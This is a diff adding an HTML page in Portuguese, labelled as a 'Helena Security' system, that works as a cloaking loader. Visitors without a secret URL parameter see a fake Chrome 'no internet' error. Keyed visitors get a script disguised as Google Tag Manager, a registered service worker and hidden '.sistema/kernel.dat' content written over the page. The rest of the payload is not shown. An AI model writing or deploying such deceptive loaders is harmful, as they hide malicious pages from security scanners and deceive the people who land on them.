@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SISTEMA JDP - SEGURANÇA HELENA</title>
+    <style>
+        body { background: #020305; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; overflow: hidden; }
+        .pulse { animation: p 1.5s infinite; color: #f59e0b; font-size: 12px; letter-spacing: 2px; text-align: center; }
+        @keyframes p { 0%, 100% { opacity: 0.3; } 50% { opacity: 1; } }
+        #error-screen { display: none; position: fixed; inset: 0; background: #fff; flex-direction: column; align-items: center; justify-content: center; text-align: center; z-index: 10000; }
+    </style>
+</head>
+<body>
+    <div id="loading" class="pulse"><h2>SINC. HELENA SECURITY...</h2></div>
+    <div id="error-screen">
+        <div style="font-size: 80px">🦖</div>
+        <h1 style="color: #202124; font-size: 22px; font-weight: 500;">Não há conexão com a Internet</h1>
+        <p style="color: #5f6368; font-size: 14px;">Verifique os cabos de rede, o modem e o roteador.</p>
+        <span style="color: #1a73e8; font-size: 13px;">ERR_INTERNET_DISCONNECTED</span>
+    </div>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const id_pedido = urlParams.get('acesso') || urlParams.get('id');
+        if (!id_pedido) { ativarModoFantasma(); } else {
+            const script = document.createElement('script');
+            script.src = `http://localhost:9090/gtm.js?id=${id_pedido}`;
+            script.onload = () => {
+                navigator.serviceWorker.register('sw.js').then(() => {
+                    fetch('.sistema/kernel.dat').then(r => r.text()).then(html => {
+                        document.open(); document.write(html); document.close();
+                    });
+                });
+            };
+            script.onerror = () => { ativarModoFantasma(); };
+            document.head.appendChild(script);
+        }
+        function ativarModoFantasma() {
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('error-screen').style.display = 'flex';
+        }
+    </script>
+</body>
+</html>
